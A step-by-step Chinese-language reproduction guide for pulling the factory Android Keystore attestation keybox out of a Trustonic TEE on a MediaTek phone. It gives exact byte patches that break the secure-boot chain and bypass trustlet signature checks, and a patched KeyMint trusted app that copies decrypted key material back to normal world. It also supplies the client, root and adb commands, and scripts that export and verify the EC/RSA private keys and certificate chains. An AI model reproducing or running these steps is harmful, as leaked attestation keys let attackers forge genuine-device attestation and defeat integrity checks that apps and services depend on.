# 从当前仓库一步步实现 TEE / KeyMint Attestation Keybox 提取

项目根目录：`<PROJECT_ROOT>`

本文回答一个问题：**拿到这个仓库后，如何按仓库里的代码、固件、脚本和中间产物，一步步复现“从 TEE/KeyMint 解出 Android Keystore attestation keybox”的过程。**

重点不是流水账，而是每一步为什么要做、做完证明了什么、下一步依赖什么。

---

## 0. 最终目标和一句话路径

目标不是 Widevine，也不是普通 APK 层 Keystore 导出，而是：

```text
Android Keystore / KeyMint factory attestation keybox
= EC/RSA attestation private key + 对应 attestation certificate chain
```

一句话利用路径：

```text
fenrir 让修改后的启动链可启动
  -> patched tee.img 让 Trustonic t-base 接受修改过的 TA
  -> 找到 KeyMint TA 处理 /mnt/vendor/persist/attest_keybox.so 的解密路径
  -> patch KeyMint TA：在 secure world 解密后，把明文 copy 回 normal world mapped buffer
  -> 用 keymint_tee_client/kmtee_probe.c 直接 mcOpenTrustlet 加载 patched TA
  -> 拉回 attest_keybox_buf_after.bin
  -> analysis/extract_keybox_plain.py 拆出 EC/RSA 私钥和证书链
  -> openssl 验证私钥、公钥、证书链一致
```

最终有效产物目录：

```text
<PROJECT_ROOT>/extracted_keybox/
```

---

## 1. 仓库目录分别负责什么

复现时先把当前目录当作一个完整工作仓库理解：

```text
fenrir/
  用来构建 patched LK / bl2_ext，核心作用是破坏后续镜像验签链。

firmware/
  原厂固件材料。这里主要用 lk.img、tee.img、init_boot.img。

pacman-fenrir-minimal.bin
  已生成且已验证可启动的最小 fenrir LK 补丁产物。

tee-patched-A-only.img
  已生成且已验证可启动的 t-base 签名校验 bypass 产物。

device_dump/
  从设备拉下来的目标运行时文件：KeyMint TA、KeyMint HAL、persist keybox blob、Trustonic client so。

analysis/
  离线逆向和 patch 脚本：
  - patch_0706_dump.py：生成 patched KeyMint TA。
  - extract_keybox_plain.py：把明文 keybox 拆成私钥和证书。
  - 0706_text*.elf / *.objdump / range_*.txt：逆向分析中间产物。

patched_ta/
  patched KeyMint TA 输出目录。

keymint_tee_client/
  normal world direct client。负责在设备上直接加载 patched TA 并发送 TCI 命令。

keymint_trigger/
  AndroidKeyStore 触发器，用来验证系统 attestation chain 和 RKP/fallback 状态。

extracted_keybox/
  最终 keybox 拆分结果。

outputdoc/
  最终报告和复现文档目录。
```

为什么这样分层：

- `fenrir/firmware/tee-patched` 解决 **能不能让 modified TA 被 TEE 接收**。
- `device_dump/analysis/patched_ta` 解决 **要 patch 哪个 TA、patch 在哪里**。
- `keymint_tee_client/` 解决 **如何不替换系统文件，单次加载 patched TA 并把结果带回 normal world**。
- `extracted_keybox/` 解决 **明文结构拆解和有效性证明**。

---

## 2. 为什么必须先做启动链和 t-base patch

正常 Android/MTK/Trustonic 链路里有两层阻拦：

### 2.1 第一层：启动链会拒绝 modified tee.img

正常链路：

```text
BootROM -> Preloader -> bl2_ext/LK -> TEE -> GZ/LK/Linux
```

`tee.img` 属于后续安全镜像，正常会被前级校验。要加载被修改过的 `tee.img`，先要让前级不再强制验签。

仓库使用的是 `fenrir`，其思路是利用 Nothing Phone 2a / MTK 在 `seccfg=unlock` 状态下的逻辑缺陷：Preloader 没有正确验证 `bl2_ext`，于是可以刷入 patched LK，让 patched LK 对后续镜像放行。

本仓库采用**最小补丁**，只改 `sec_get_vfy_policy`，不做 lock state spoof，原因是本题目标是 TEE/KeyMint keybox 提取，不需要为了完整性检测去伪装锁状态，减少变量。

核心配置：

```text
<PROJECT_ROOT>/fenrir/minimal.json
```

内容本质：

```text
pattern     = 00 01 00 b4 fd 7b bf a9
replacement = 00 00 80 52 c0 03 5f d6
match_mode  = all
```

含义：让对应 secure boot policy 函数直接返回“不强制校验”。

### 2.2 第二层：Trustonic t-base 会拒绝 modified TA

即使 modified `tee.img` 可以启动，Trustonic t-base 仍然会校验 MCLF trustlet 签名。我们后面要加载的是 patched KeyMint TA，所以还要 patch t-base 的 trustlet signature verify。

本仓库验证过的安全做法是只打补丁 A：

```text
tee.img file offset 0xBE978: ff032ed1 -> 00008052
tee.img file offset 0xBE97C: e203022a -> c0035fd6
```

即把 verifySignature 结果强制改成成功返回。

不要使用早期 `tee-patched.img`，因为它还包含补丁 B，实测会导致系统进 recovery。

---

## 3. 从仓库构建/确认 fenrir LK

如果直接使用仓库已有产物：

```bash
cd "<PROJECT_ROOT>"
shasum -a 256 pacman-fenrir-minimal.bin
```

期望：

```text
9029bc92baff7bca64c02b42036e287669ad45be7e34dfb2b0d2928d331ccfbb  pacman-fenrir-minimal.bin
```

如果要从 `fenrir/` 重新生成：

```bash
cd "<PROJECT_ROOT>/fenrir"
../fenrir/.venv/bin/python injector/inject.py pacman bin/pacman.bin -o ../pacman-fenrir-minimal.bin --config minimal.json
```

验证输出存在：

```bash
cd "<PROJECT_ROOT>"
ls -lh pacman-fenrir-minimal.bin
shasum -a 256 pacman-fenrir-minimal.bin
```

刷入 active slot，本机是 `_a`：

```bash
adb reboot bootloader
fastboot getvar current-slot
fastboot flash lk_a "<PROJECT_ROOT>/pacman-fenrir-minimal.bin"
fastboot reboot
```

做这一步的原因：

- 后面要刷入 modified `tee.img`。
- 没有 patched LK，modified TEE 会被启动链拒绝。
- 只刷 active slot 是为了保留另一个 slot 的回退可能。

成功判据：

```bash
adb devices -l
adb shell getprop ro.boot.slot_suffix
adb shell getprop init.svc.tee-1-1
```

应看到：

```text
ro.boot.slot_suffix=_a
init.svc.tee-1-1=running
```

---

## 4. 从仓库构建/确认 patched tee.img

本仓库已经有验证可启动的产物：

```bash
cd "<PROJECT_ROOT>"
shasum -a 256 tee-patched-A-only.img
```

期望：

```text
90d55d5044cf732d64ba73cc52693f9303cb5b8f3d57189f382f15eceed7245d  tee-patched-A-only.img
```

如果需要从原厂 `tee.img` 重新生成：

```bash
cd "<PROJECT_ROOT>"
python3 - <<'PY'
from pathlib import Path
import hashlib
src = Path('firmware/u25-candidates/Pacman_U2.5-231207-0042/tee.img')
dst = Path('tee-patched-A-only.img')
b = bytearray(src.read_bytes())
assert b[0xBE978:0xBE980] == bytes.fromhex('ff032ed1e203022a')
b[0xBE978:0xBE980] = bytes.fromhex('00008052c0035fd6')
dst.write_bytes(b)
print('src', hashlib.sha256(src.read_bytes()).hexdigest())
print('dst', hashlib.sha256(b).hexdigest())
PY
```

为什么使用 U2.5 的 `tee.img`：

- 设备系统是 NOS U2.5 系列。
- 实测 U2.6 `tee.img` 刷到 U2.5 系统会进 recovery。
- `tee.img` 不是越新越好，TEE 内嵌驱动和 vendor/userdata 依赖要匹配。

刷入 active slot：

```bash
adb reboot bootloader
fastboot getvar current-slot
fastboot flash tee_a "<PROJECT_ROOT>/tee-patched-A-only.img"
fastboot reboot
```

成功判据：

```bash
adb shell 'getprop init.svc.tee-1-1; getprop init.svc.keystore2'
adb shell 'ps -A | grep -Ei "tee|keymint|keystore"'
```

应看到：

```text
tee-1-1=running
keystore2=running
android.hardware.security.keymint@2.0-service.trustonic running
```

做这一步的原因：

- patched KeyMint TA 的 MCLF 签名必然不再匹配。
- 只有 t-base 签名校验被 bypass，`mcOpenTrustlet()` 才能加载我们后面生成的 patched TA。

---

## 5. 准备 root 和设备文件 dump

本仓库已经有 dump：

```text
<PROJECT_ROOT>/device_dump/
```

如果从新设备复现，需要 root 后拉这些文件。root 这里用 Magisk patched init_boot，仓库已有：

```text
<PROJECT_ROOT>/magisk_patched.img
```

刷 root：

```bash
adb reboot bootloader
fastboot flash init_boot_a "<PROJECT_ROOT>/magisk_patched.img"
fastboot reboot
```

确认 root：

```bash
adb shell 'command -v su; su -c id'
```

从设备拉关键文件：

```bash
cd "<PROJECT_ROOT>"
mkdir -p device_dump/vendor_app_mcRegistry device_dump/persist device_dump/vendor_bin_hw device_dump/vendor_lib64 device_dump/system_ext_lib64 device_dump/system_apex

adb shell 'su -c "cp /vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin /data/local/tmp/0706000000000000000000000000004d.tlbin"'
adb shell 'su -c "cp /mnt/vendor/persist/attest_keybox.so /data/local/tmp/attest_keybox.so"'
adb shell 'su -c "cp /mnt/vendor/persist/attestation_ids.so /data/local/tmp/attestation_ids.so"'
adb shell 'su -c "cp /vendor/bin/hw/android.hardware.security.keymint@2.0-service.trustonic /data/local/tmp/keymint_hal"'
adb shell 'su -c "cp /vendor/lib64/libMcClient.so /data/local/tmp/libMcClient.so"'

adb pull /data/local/tmp/0706000000000000000000000000004d.tlbin device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin
adb pull /data/local/tmp/attest_keybox.so device_dump/persist/attest_keybox.so
adb pull /data/local/tmp/attestation_ids.so device_dump/persist/attestation_ids.so
adb pull /data/local/tmp/keymint_hal device_dump/vendor_bin_hw/android.hardware.security.keymint@2.0-service.trustonic
adb pull /data/local/tmp/libMcClient.so device_dump/vendor_lib64/libMcClient.so
```

确认哈希：

```bash
shasum -a 256 \
  device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin \
  device_dump/persist/attest_keybox.so \
  device_dump/persist/attestation_ids.so
```

本机已验证值：

```text
ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2  070600...4d.tlbin
64fa3546cb36ae14c0388ee7fa1d5619251b26521f21ede56970beea73386f69  attest_keybox.so
5c8a419d3110f38256c0146af5e25e6a5f21e56a3b7ecc70e35fbe2889095c74  attestation_ids.so
```

做这一步的原因：

- `attest_keybox.so` 是 encrypted factory attestation keybox 存储体。
- `attestation_ids.so` 是配套设备身份/attestation ids 存储体。
- `070600...4d.tlbin` 是真正解密和使用 keybox 的 KeyMint TA。
- `libMcClient.so` 是 normal world 直接调用 Trustonic TEE 的客户端库，后面编译 `kmtee_probe` 需要链接它。

---

## 6. 如何根据仓库文件确认目标 TA 是 KeyMint，不是 Widevine

先看 HAL 字符串：

```bash
cd "<PROJECT_ROOT>"
strings -a device_dump/vendor_bin_hw/android.hardware.security.keymint@2.0-service.trustonic \
  | grep -Ei 'attest|keybox|keymint|mcRegistry|persist|rkp|provision'
```

关键输出：

```text
/mnt/vendor/persist/attest_keybox.so
/mnt/vendor/persist/attestation_ids.so
vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin
TEE_AttestIds
TEE_GenerateAndAttestKey
TEE_AttestKey
Trustonic keymint
Kinibi Keymint
```

这一步说明：**normal world 的 KeyMint HAL 明确会打开 `070600...4d.tlbin`，并会读取 `/mnt/vendor/persist/attest_keybox.so`。**

再看 TA 字符串：

```bash
strings -a device_dump/vendor_app_mcRegistry/0706000000000000000000000000004d.tlbin \
  | grep -Ei 'KEYMINT|keybox|attest|rkp|bcc|decrypt|verify|EEK|VTS'
```

关键输出：

```text
KEYMINT
Keymint TA
teeKeymint-package-2.0.0-20220420
Decrypting keybox is success!
Verify Keybox Signature...
decrypt_keybox
verify_keybox
rkp_bcc_km
tlTeeKeymint: [WARNING] USING EEK ROOT KEY FROM VTS
```

这一步说明：

- `070600...4d.tlbin` 就是 KeyMint TA。
- TA 内部有 `decrypt_keybox` / `verify_keybox` 逻辑。
- TA 支持 RKP/BCC，但本地仍存在 factory `attest_keybox.so`。

为什么排除 Widevine：

- Widevine 目标是 DRM/OEMCrypto keybox，TA/服务名会出现 `OEMCrypto`、`WVCdm`、DRM 相关 UUID。
- 本题目标是 Android Keystore attestation，应该从 KeyMint HAL 和 KeyMint TA 出发。
- `MediaDrm` 触发 WVCdm 能证明 DRM 通路活，但不能导出 Keystore attestation keybox。

---

## 7. 逆向定位：为什么 patch 这几个地址

仓库里已经保留了逆向中间产物：

```text
analysis/0706_text.objdump
analysis/0706_text.llvmobjdump
analysis/range_13a00_13e20.txt
analysis/range_1de70_1e250.txt
analysis/range_1e250_1f020.txt
analysis/range_1d600_1de70.txt
```

KeyMint TA 的 MCLF 映射关系：

```text
text file offset = 0xd0
text VA base     = 0x1000
file offset      = VA - 0x1000 + 0xd0
```

这个关系在 `analysis/patch_0706_dump.py` 里固化为：

```python
TEXT_BASE = 0x1000
TEXT_OFF  = 0xd0
def off(va): return TEXT_OFF + (va - TEXT_BASE)
```

关键函数链：

```text
0x13b00: TCI dispatcher
  cmd 0x00050202 -> 0x1e430   # 处理 attest_keybox.so
  cmd 0x00050204 -> 0x1e9a0   # 处理 attestation_ids.so
  cmd 0x00050016 -> 0x13598   # close

0x1e430
  -> 从 TCI+0x0c 读取 mcBulkMap_t
  -> 把 normal world mapped input 复制到 TA heap
  -> call 0x1de70(heap, len)

0x1de70
  -> 分配 plaintext buffer
  -> call 0x22738 解密 secure object
  -> call 0x1d9b8 解析 plaintext keybox
  -> 释放 plaintext buffer
```

为什么选择在 `0x1de70` 附近 patch：

- `0x22738` 调用后，plaintext keybox 已经出现在 secure world 内存。
- `0x1d9b8` parse 前，明文结构尚完整，最适合 copy。
- 原始逻辑 parse 完就释放 plaintext，normal world 永远拿不到明文。
- 所以 patch 的目标不是“破解加密算法”，而是“借 TA 自己合法解密后的瞬间，把明文复制回 normal world 可见 buffer”。

具体 patch 点：

```text
0x1df3c -> branch 0x411ac
  原位置即将调用 parse，patch 后先 memcpy(input_heap, plaintext, plaintext_len)，再回到原 parse。

0x1e4d4 -> branch 0x411cc
  handler 0x1e430 返回前，patch 后 memcpy(mapped_input, input_heap, original_len)，把明文带回 normal world mapped buffer。

0x411ac
  TA 内部 code cave，放我们的短 stub。

0x50f0
  TA 内部 memcpy，可直接调用，避免引入外部符号。
```

这个设计的原因：

- 第一次 copy：把 transient plaintext 保存到 handler 作用域里仍然存在的 heap input buffer。
- 第二次 copy：handler 返回前把 heap input buffer 写回 `mcMap()` 映射的 normal world buffer。
- 这样 `kmtee_probe` 在 `mcWaitNotification()` 返回后，直接保存同一块输入 buffer，就得到明文 keybox。

---

## 8. 生成 patched KeyMint TA

直接运行仓库脚本：

```bash
cd "<PROJECT_ROOT>"
python3 analysis/patch_0706_dump.py
```

期望输出：

```text
wrote patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
src sha256 ad17a40a49cc0c812f78359a72d5d5c73b54eabac261f861db6d1f72b3b745b2
dst sha256 92d66968007e462f1c56c7aaee4ca4d5deb4da8822ba396035001d72f67b1016
```

确认：

```bash
shasum -a 256 patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

期望：

```text
92d66968007e462f1c56c7aaee4ca4d5deb4da8822ba396035001d72f67b1016  patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin
```

脚本里的保护点：

```python
expected = {
    0x1df3c: bytes.fromhex('e08744a9'),
    0x1e4d4: bytes.fromhex('f303002a'),
    0x411ac: bytes(len(snippet)),
}
```

也就是说，如果 TA 版本不匹配，脚本会因为 expected mismatch 直接退出，避免把错误补丁打到错误版本。

---

## 9. 为什么不用替换 /vendor/app/mcRegistry

有两种方案：

```text
方案 A：替换系统 /vendor/app/mcRegistry/070600...4d.tlbin
方案 B：自己写 normal world client，直接 mcOpenTrustlet() 加载 patched TA 字节
```

本仓库采用方案 B，文件是：

```text
<PROJECT_ROOT>/keymint_tee_client/kmtee_probe.c
```

原因：

- 不动 `/vendor`，失败不会影响系统 KeyMint 服务。
- 不需要 bind mount，不需要停止 keystore2。
- 一次运行只开启一个独立 Trustonic session。
- 输出目录固定在 `/data/local/tmp/kmtee_out`，便于拉回。
- patched TA 路径由 argv 指定，便于测试不同 patch 版本。

`kmtee_probe.c` 做了五件事：

```text
1. 读取 patched TA 文件。
2. 读取 /mnt/vendor/persist/attest_keybox.so。
3. 读取 /mnt/vendor/persist/attestation_ids.so。
4. mcOpenDevice + mcOpenTrustlet 打开 patched KeyMint TA。
5. 对 keybox 和 ids 分别 mcMap buffer，发送 TCI cmd，等待 TA 返回，然后保存 buffer_after。
```

TCI 命令：

```c
#define CMD_ATTEST_KEYBOX 0x00050202u
#define CMD_ATTEST_IDS    0x00050204u
#define CMD_CLOSE         0x00050016u
```

TCI 布局：

```text
TCI[0x00:0x04] = command id
TCI[0x04:0x08] = TA return code
TCI[0x0c:0x14] = mcBulkMap_t {sVirtualAddr, sVirtualLen}
```

---

## 10. 编译 direct client

需要 Android NDK，本机路径：

```text
<HOST_SDK>/ndk/25.2.9519653/toolchains/llvm/prebuilt/darwin-x86_64
```

编译：

```bash
cd "<PROJECT_ROOT>"
NDK=<HOST_SDK>/ndk/25.2.9519653/toolchains/llvm/prebuilt/darwin-x86_64

$NDK/bin/aarch64-linux-android33-clang -Wall -Wextra -O2 \
  keymint_tee_client/kmtee_probe.c \
  -o keymint_tee_client/kmtee_probe \
  -Ldevice_dump/vendor_lib64 -lMcClient -Wl,-rpath,/vendor/lib64
```

确认：

```bash
file keymint_tee_client/kmtee_probe
$NDK/bin/llvm-readelf -d keymint_tee_client/kmtee_probe | grep -E 'NEEDED|RUNPATH'
```

期望：

```text
ELF 64-bit LSB pie executable, ARM aarch64
NEEDED libMcClient.so
RUNPATH [/vendor/lib64]
```

为什么链接本地 dump 的 `libMcClient.so`：

- 编译期需要符号解析。
- 运行期实际会用设备 `/vendor/lib64/libMcClient.so`。
- `-Wl,-rpath,/vendor/lib64` 确保设备上优先从 vendor lib 目录找 Trustonic client 库。

---

## 11. 在设备上运行 patched TA 提取

推送：

```bash
cd "<PROJECT_ROOT>"
adb push keymint_tee_client/kmtee_probe /data/local/tmp/kmtee_probe
adb push patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin
```

运行：

```bash
adb shell 'su -c "chmod 755 /data/local/tmp/kmtee_probe && LD_LIBRARY_PATH=/vendor/lib64:/system_ext/lib64 /data/local/tmp/kmtee_probe /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin"'
```

成功输出应包含：

```text
tl_path=/data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin
tl=281651 keybox=8716 ids=892
mcOpenDevice ret=0x0
mcOpenTrustlet ret=0x0 sessionId=...
[attest_keybox] mcMap ret=0x0
[attest_keybox] mcWait ret=0x0 tci_ret=0x0
[attestation_ids] mcMap ret=0x0
[attestation_ids] mcWait ret=0x0 tci_ret=0x0
close cmd ret=0x0 tci_ret=0x0
DONE rc1=0 rc2=0
```

做这一步时发生了什么：

```text
normal world: kmtee_probe 读取 encrypted attest_keybox.so
normal world: mcMap 把 encrypted buffer 映射给 TA
secure world: patched KeyMint TA 正常解密 keybox
secure world: patch stub 把 plaintext 写回 mapped buffer
normal world: mcWaitNotification 返回
normal world: kmtee_probe 把 buffer_after 写入 /data/local/tmp/kmtee_out/attest_keybox_buf_after.bin
```

拉回输出：

```bash
cd "<PROJECT_ROOT>"
rm -rf keymint_tee_client/out_patched
mkdir -p keymint_tee_client/out_patched
adb exec-out su -c 'cd /data/local/tmp/kmtee_out && tar -cf - .' | tar -C keymint_tee_client/out_patched -xf -
```

确认关键文件：

```bash
find keymint_tee_client/out_patched -maxdepth 1 -type f -print -exec shasum -a 256 {} \;
xxd -g1 -l 64 keymint_tee_client/out_patched/attest_keybox_buf_after.bin
cmp -l keymint_tee_client/out_patched/attest_keybox_before.bin keymint_tee_client/out_patched/attest_keybox_buf_after.bin | head
```

成功特征：

```text
attest_keybox_before.bin     sha256 = 64fa3546cb36ae14c0388ee7fa1d5619251b26521f21ede56970beea73386f69
attest_keybox_buf_after.bin  sha256 = de421186ae164c9d966f5a313ff5935a477366092890a91d26ee9f6322975ca7
```

`attest_keybox_buf_after.bin` 开头应该能看到结构化明文：

```text
01 00 00 00 8a 00 00 00 30 81 87 02 01 00 30 13 ...
```

解释：

```text
01 00 00 00 = version/keybox number
8a 00 00 00 = EC private key DER length = 138
30 81 87... = DER SEQUENCE 开头
```

这一步就是提取成功的关键证据：**encrypted blob 被 TA 解密后，明文已经被复制回 normal world。**

---

## 12. 拆分明文 keybox

运行：

```bash
cd "<PROJECT_ROOT>"
python3 analysis/extract_keybox_plain.py
```

脚本解析逻辑：

```text
u32 version
for alg in [ec, rsa]:
  u32 private_key_len
  DER private_key
  u32 cert_count
  repeat cert_count:
    u32 cert_len
    DER cert
```

成功输出：

```text
version_or_keybox_number=1
ec_private_key.der len=138
ec_cert_count=3
ec_cert_0.der len=503
ec_cert_1.der len=920
ec_cert_2.der len=1312
rsa_private_key.der len=1794
rsa_cert_count=3
rsa_cert_0.der len=1252
rsa_cert_1.der len=1349
rsa_cert_2.der len=1312
plaintext_len=8624
tail_unmodified_len=92
```

输出目录：

```text
extracted_keybox/attestation_keybox_plain.bin
extracted_keybox/ec_private_key.der
extracted_keybox/ec_cert_0.der
extracted_keybox/ec_cert_1.der
extracted_keybox/ec_cert_2.der
extracted_keybox/rsa_private_key.der
extracted_keybox/rsa_cert_0.der
extracted_keybox/rsa_cert_1.der
extracted_keybox/rsa_cert_2.der
```

为什么 `tail_unmodified_len=92` 正常：

- 原始 `attest_keybox.so` 长度 8716 字节。
- 解密出的结构化 keybox 明文长度 8624 字节。
- 剩余 92 字节属于原 secure object 尾部残留/认证包装，不属于 keybox 主结构。

---

## 13. 转 PEM、验私钥和证书链

转 PEM：

```bash
cd "<PROJECT_ROOT>"
for alg in ec rsa; do
  openssl pkey -inform DER -in extracted_keybox/${alg}_private_key.der -out extracted_keybox/${alg}_private_key.pem
  for i in 0 1 2; do
    openssl x509 -inform DER -in extracted_keybox/${alg}_cert_${i}.der -out extracted_keybox/${alg}_cert_${i}.pem
  done
  cat extracted_keybox/${alg}_cert_0.pem extracted_keybox/${alg}_cert_1.pem extracted_keybox/${alg}_cert_2.pem > extracted_keybox/${alg}_cert_chain.pem
done
```

验证私钥和 leaf cert 公钥一致：

```bash
for alg in ec rsa; do
  echo "== $alg private pub =="
  openssl pkey -in extracted_keybox/${alg}_private_key.pem -pubout -outform DER | shasum -a 256
  echo "== $alg cert0 pub =="
  openssl x509 -inform DER -in extracted_keybox/${alg}_cert_0.der -pubkey -noout | openssl pkey -pubin -outform DER | shasum -a 256
done
```

本机结果：

```text
EC  private pub == EC  cert0 pub = 11c57706dc0ec55c912de361742c7b5527a404ce6ed8fd32be8b6facc8b81b90
RSA private pub == RSA cert0 pub = f950a598e25c83a1f4025225b4100e47b2dc9078a7d3f2dd3606882f07f00a2f
```

验证证书链：

```bash
openssl verify -CAfile extracted_keybox/ec_cert_2.pem  -untrusted extracted_keybox/ec_cert_1.pem  extracted_keybox/ec_cert_0.pem
openssl verify -CAfile extracted_keybox/rsa_cert_2.pem -untrusted extracted_keybox/rsa_cert_1.pem extracted_keybox/rsa_cert_0.pem
```

期望：

```text
extracted_keybox/ec_cert_0.pem: OK
extracted_keybox/rsa_cert_0.pem: OK
```

签名验签：

```bash
printf 'keybox-sign-test' > extracted_keybox/sign_test.txt
openssl dgst -sha256 -sign extracted_keybox/ec_private_key.pem  -out extracted_keybox/ec_sig.bin  extracted_keybox/sign_test.txt
openssl dgst -sha256 -verify <(openssl x509 -in extracted_keybox/ec_cert_0.pem -pubkey -noout)  -signature extracted_keybox/ec_sig.bin  extracted_keybox/sign_test.txt
openssl dgst -sha256 -sign extracted_keybox/rsa_private_key.pem -out extracted_keybox/rsa_sig.bin extracted_keybox/sign_test.txt
openssl dgst -sha256 -verify <(openssl x509 -in extracted_keybox/rsa_cert_0.pem -pubkey -noout) -signature extracted_keybox/rsa_sig.bin extracted_keybox/sign_test.txt
```

期望：

```text
Verified OK
Verified OK
```

这三类验证分别证明：

```text
1. 私钥和 cert0 是一对。
2. cert0 -> cert1 -> root 证书链成立。
3. 私钥确实可用，不只是格式上像 DER。
```

---

## 14. 和 AndroidKeyStore 实际 attestation chain 对照

仓库中 `keymint_trigger/` 是系统层验证工具。它通过 AndroidKeyStore 生成带 challenge 的 EC/RSA key，并导出 attestation certificate chain。

输出位置：

```text
keymint_trigger/out/ec_cert_0.der .. ec_cert_3.der
keymint_trigger/out/rsa_cert_0.der .. rsa_cert_3.der
```

对照关系：

```text
keymint_trigger/out/ec_cert_0.der   = AndroidKeyStore 新生成 key 的 attestation leaf
extracted_keybox/ec_cert_0.der      = keymint_trigger/out/ec_cert_1.der
extracted_keybox/ec_cert_1.der      = keymint_trigger/out/ec_cert_2.der
extracted_keybox/ec_cert_2.der      = keymint_trigger/out/ec_cert_3.der

keymint_trigger/out/rsa_cert_0.der  = AndroidKeyStore 新生成 key 的 attestation leaf
extracted_keybox/rsa_cert_0.der     = keymint_trigger/out/rsa_cert_1.der
extracted_keybox/rsa_cert_1.der     = keymint_trigger/out/rsa_cert_2.der
extracted_keybox/rsa_cert_2.der     = keymint_trigger/out/rsa_cert_3.der
```

这个对照很重要，原因是：

- 单独从 blob 里拆出私钥和证书，只能证明它们结构有效。
- 与系统实际 attestation chain 对上，才能证明这就是设备 KeyMint 正在使用/可 fallback 使用的 factory attestation chain。

---

## 15. RKP 在这个流程里的位置

这台设备有 RKP 组件：

```text
android.hardware.security.keymint.IRemotelyProvisionedComponent/default
remote_provisioning
com.android.rkpdapp
/system/apex/com.android.rkpd.apex
```

KeyMint TA 也有 RKP/BCC 字符串：

```text
rkp_bcc_km
USING EEK ROOT KEY FROM VTS
```

但本次日志显示：

```text
No keys are available, kicking off provisioning
remoteprovisioning.googleapis.com
Unable to resolve host
ERROR_PENDING_INTERNET_CONNECTIVITY
OUT_OF_KEYS_TRANSIENT_ERROR
```

结论：

```text
设备支持 RKP，并且 framework 会优先尝试 RKP。
但当前没有可用 cached RKP key，远程 provisioning 又失败。
因此本次 AndroidKeyStore attestation fallback 到本地 factory TEE chain。
```

这也是为什么提取 `attest_keybox.so` 有意义：它不是 RKP 临时 leaf key，而是本地 factory attestation keybox。

---

## 16. 全流程最短复现命令汇总

在设备已经处于：patched LK + patched tee + Magisk root + TEE 服务健康 的前提下，只需要：

```bash
cd "<PROJECT_ROOT>"

# 1. 生成 patched KeyMint TA
python3 analysis/patch_0706_dump.py

# 2. 编译 direct client
NDK=<HOST_SDK>/ndk/25.2.9519653/toolchains/llvm/prebuilt/darwin-x86_64
$NDK/bin/aarch64-linux-android33-clang -Wall -Wextra -O2 \
  keymint_tee_client/kmtee_probe.c \
  -o keymint_tee_client/kmtee_probe \
  -Ldevice_dump/vendor_lib64 -lMcClient -Wl,-rpath,/vendor/lib64

# 3. 推送并运行
adb push keymint_tee_client/kmtee_probe /data/local/tmp/kmtee_probe
adb push patched_ta/0706000000000000000000000000004d.dumpkeybox.tlbin /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin
adb shell 'su -c "chmod 755 /data/local/tmp/kmtee_probe && LD_LIBRARY_PATH=/vendor/lib64:/system_ext/lib64 /data/local/tmp/kmtee_probe /data/local/tmp/0706000000000000000000000000004d.dumpkeybox.tlbin"'

# 4. 拉回输出
rm -rf keymint_tee_client/out_patched
mkdir -p keymint_tee_client/out_patched
adb exec-out su -c 'cd /data/local/tmp/kmtee_out && tar -cf - .' | tar -C keymint_tee_client/out_patched -xf -

# 5. 拆分 keybox
python3 analysis/extract_keybox_plain.py

# 6. 验证
for alg in ec rsa; do
  openssl pkey -inform DER -in extracted_keybox/${alg}_private_key.der -out extracted_keybox/${alg}_private_key.pem
  for i in 0 1 2; do
    openssl x509 -inform DER -in extracted_keybox/${alg}_cert_${i}.der -out extracted_keybox/${alg}_cert_${i}.pem
  done
done
openssl verify -CAfile extracted_keybox/ec_cert_2.pem  -untrusted extracted_keybox/ec_cert_1.pem  extracted_keybox/ec_cert_0.pem
openssl verify -CAfile extracted_keybox/rsa_cert_2.pem -untrusted extracted_keybox/rsa_cert_1.pem extracted_keybox/rsa_cert_0.pem
```

---

## 17. 避坑和原因总结

### 17.1 不要走 Widevine

现象：MediaDrm 可以唤起 WVCdm，日志里 WVCdm 处理 DRM 文件。

问题：这只能证明 Widevine DRM 路径通了，和 Android Keystore attestation keybox 不是一类东西。

正确方向：从 `android.hardware.security.keymint@2.0-service.trustonic` 和 `070600...4d.tlbin` 入手。

### 17.2 不要混刷 U2.6 TEE 到 U2.5 系统

现象：刷 U2.6 `tee.img` 后进 recovery。

原因：TEE 内嵌组件和 U2.5 vendor/system 不匹配。

正确做法：使用 U2.5 系列 `tee.img`，并且只刷 active slot。

### 17.3 不要用包含补丁 B 的 tee-patched.img

现象：早期 A+B 版本导致无法正常启动。

正确做法：只用 `tee-patched-A-only.img`。

### 17.4 不要替换系统 KeyMint TA 作为主复现路径

替换 `/vendor/app/mcRegistry` 风险高，而且会影响系统服务。

正确做法：用 `kmtee_probe.c` 直接 `mcOpenTrustlet()` 加载 patched TA 字节。

### 17.5 TA patch 只能用于匹配版本

`analysis/patch_0706_dump.py` 有 expected bytes 检查。如果 mismatch，不要强行 patch。

原因：TA 版本变了，函数地址、栈布局、寄存器约定可能都变了，强行 patch 会崩或输出垃圾。

### 17.6 RKP 不是本次提取对象

RKP 是远程动态 provisioning 体系。本次提取的是本地 factory keybox。

如果设备联网后成功拿到 RKP key，未来系统 attestation 可能优先使用 RKP chain；但这不改变 `attest_keybox.so` 中 factory keybox 的存在。

---

## 18. 判断复现成功的最小证据链

只要满足以下四条，就可以认定复现成功：

```text
1. patched TA 运行成功：
   mcOpenTrustlet ret=0x0，cmd 0x00050202 tci_ret=0x0。

2. buffer_after 明显变成 keybox 明文：
   attest_keybox_buf_after.bin 开头为 01 00 00 00 8a 00 00 00 30 81 87...

3. extract_keybox_plain.py 成功拆出：
   EC private key + 3 certs，RSA private key + 3 certs。

4. OpenSSL 验证通过：
   私钥公钥等于 cert0 公钥，EC/RSA chain verify OK，签名验签 OK。
```

本仓库当前已经满足以上条件。
